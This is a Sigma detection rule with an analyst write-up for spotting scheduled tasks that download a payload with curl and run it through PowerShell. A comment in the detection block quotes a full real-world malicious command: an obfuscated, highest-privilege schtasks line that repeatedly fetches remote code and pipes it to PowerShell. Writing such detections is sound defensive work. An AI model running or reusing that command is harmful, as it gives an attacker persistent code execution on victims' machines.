title: Scheduled Task Creation with Curl and PowerShell Execution Combo
id: 1d174d38-8fda-4081-a9b6-56d9763c0cd8
status: experimental
description: |
  Detects the creation of a scheduled task using schtasks.exe, potentially in combination with curl for downloading payloads and PowerShell for executing them.
  This facilitates executing malicious payloads or connecting with C&C server persistently without dropping the malware sample on the host.
references:
- https://tria.ge/241015-l98snsyeje/behavioral2
author: Swachchhanda Shrawan Poudel (Nextron Systems)
date: 2025-02-05
tags:
- attack.privilege-escalation
- attack.execution
- attack.persistence
- attack.t1053.005
- attack.defense-evasion
- attack.t1218
- attack.command-and-control
- attack.t1105
logsource:
  category: process_creation
  product: windows
detection:
    # Example: cmd start /min /c schtasks /create /tn PolicyConverter /sc minute /mo 15 /tr "conhost --headless cmd /v:on /c set a=https&set b=inh&set c=ostne&set d=tservice.co&set e=!a!://www.!b!!c!!d!m& curl -o - !e!/mscu/lokc.php?wl=HGNBWBGW**Admin | powershell" /rl Highest
  selection_img:
    Image|endswith: '\schtasks.exe'
    CommandLine|contains|windash: ' /create '
  selection_curl:
    CommandLine|contains|all:
    - 'curl '
    - 'http'
    - '-o'
  selection_powershell:
    CommandLine|contains: 'powershell'
  condition: all of selection_*
falsepositives:
- Legitimate use of schtasks for administrative purposes.
- Automation scripts combining curl and PowerShell in controlled environments.
level: medium
note: |
  ### Technical Context
  This detection rule identifies the creation of scheduled tasks using `schtasks.exe`, which is potentially combined with `curl` for downloading malicious payloads and executing them via PowerShell. This technique allows an attacker to maintain persistence on a compromised host without leaving malware samples behind, making it a stealthy method for executing commands or connecting to a Command-and-Control (C&C) server.

  The likely threat scenario involves an attacker utilizing these tools to set up automated tasks that execute malicious scripts or binaries, aiming to establish long-term control over the target systems. Such activities typically fall within the realm of evading detection through scheduled automation, allowing for continuation of malicious operations even after reboots or user logouts.

  This behavior aligns with several MITRE ATT&CK tactics and techniques, including:
  - **Execution** (T1203): Exploiting the system to execute commands.
  - **Persistence** (T1053.005): Creating a scheduled task to maintain access.
  - **Defense Evasion** (T1218): Using trusted Windows tools to perform malicious actions covertly.
  - **Command and Control** (T1105): Downloading payloads from external sources.

  Primary data sources that contain critical evidence include:
  - Process creation events, which log command-line arguments and the applications invoked.
  - Audit logs from Windows Task Scheduler that can show when and how tasks were created.

  ### Investigation Steps
  - **Review Process Creation Events:** Examine logs for the process creation of `schtasks.exe`, filtering specifically for commands that include `/create`. Pay attention to command lines with suspicious or unusual parameters.

  - **Analyze Command-Line for Downloading and Execution:** Check for instances where `curl` is used in conjunction with `powershell`. Determine if the command line indicates the download of content from external servers, as this may signify an attempt to execute unvetted scripts or binaries.

  - **Inspect Scheduled Task Definitions:** Investigate the scheduled tasks that have been recently created for any that may use unusual task names or execute untrusted scripts. Identify the execution context and frequency of these tasks.

  - **Monitor Network Connections:** Look out for outbound network connections triggered by newly created scheduled tasks, especially those reaching external IPs or domains. Validate if these align with known malicious infrastructures.

  ### Prioritization
  The severity of this alert is medium due to the potential impact associated with unauthorized persistence mechanisms and command execution that could lead to further compromise of the environment. However, legitimate administrative use cases may lead to false positives, requiring nuanced analysis.

  ### Blind Spots and Assumptions
  There may be gaps in detection coverage for scheduled tasks created with legitimate administrative intent. The detection logic assumes that any usage of `schtasks.exe` with `curl` and `PowerShell` in combination signifies malicious intent, which may not always hold true. Ensuring appropriate logging of process creation events and command-line arguments is essential for the rule to function effectively, alongside monitoring configurations of Windows Task Scheduler for auditing.

